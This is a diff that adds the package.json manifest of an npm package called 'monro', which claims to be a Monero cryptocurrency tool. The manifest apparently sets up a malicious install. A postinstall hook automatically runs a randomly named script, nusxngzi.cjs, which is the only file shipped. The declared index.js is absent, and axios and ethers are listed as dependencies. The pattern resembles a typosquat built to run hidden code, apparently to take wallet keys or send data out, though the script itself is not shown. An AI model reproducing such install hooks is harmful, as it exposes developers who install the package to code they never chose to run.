@@ -1,0 +1,31 @@
+{
+  "name": "monro",
+  "version": "1.0.6",
+  "description": "node-monero is a simple tool for all things related to the cryptocurrency.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node nusxngzi.cjs"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/outlets-npm/node-monero.git"
+  },
+  "keywords": [
+    "monero",
+    "anonymous",
+    "cryptocurrency"
+  ],
+  "author": "outlets@protonmail.com",
+  "license": "MIT",
+  "bugs": {
+    "url": "https://github.com/outlets-npm/node-monero/issues"
+  },
+  "homepage": "https://github.com/outlets-npm/node-monero#readme",
+  "files": [
+    "nusxngzi.cjs"
+  ],
+  "dependencies": {
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  }
+}
